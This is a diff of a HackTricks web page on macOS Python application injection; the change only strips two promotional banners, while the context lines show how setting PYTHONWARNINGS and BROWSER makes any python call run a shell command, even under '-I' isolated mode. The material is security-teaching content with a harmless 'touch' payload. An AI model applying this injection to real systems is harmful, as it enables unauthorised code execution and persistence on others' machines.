@@ -175,18 +175,6 @@
                 <div id="content" class="content">
                     <main>
                         <h1 id="macos-python-applications-injection"><a class="header" href="#macos-python-applications-injection">macOS Python Applications Injection</a></h1>
-<div class='notice notice-success'><b>SUCCESS</b><br/>
-Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
-<details>
-<summary>Support HackTricks</summary>
-<ul>
-<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
-<li><strong>Join the</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
-<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
-</ul>
-</details>
-</div>
 <h2 id="via-pythonwarnings-and-browser-env-variables"><a class="header" href="#via-pythonwarnings-and-browser-env-variables">Via <code>PYTHONWARNINGS</code> and <code>BROWSER</code> env variables</a></h2>
 <p>It's possible to alter both environment variables to execute arbitrary code whenever python is called, for example:</p>
 <pre><code class="language-bash"># Generate example python script
@@ -198,18 +186,6 @@ PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktri
 # RCE which will generate file /tmp/hacktricks bypassing "-I" injecting "-W" before the script to execute
 BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
 </code></pre>
-<div class='notice notice-success'><b>SUCCESS</b><br/>
-Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
-<details>
-<summary>Support HackTricks</summary>
-<ul>
-<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
-<li><strong>Join the</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
-<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
-</ul>
-</details>
-</div>
 
                     </main>
 
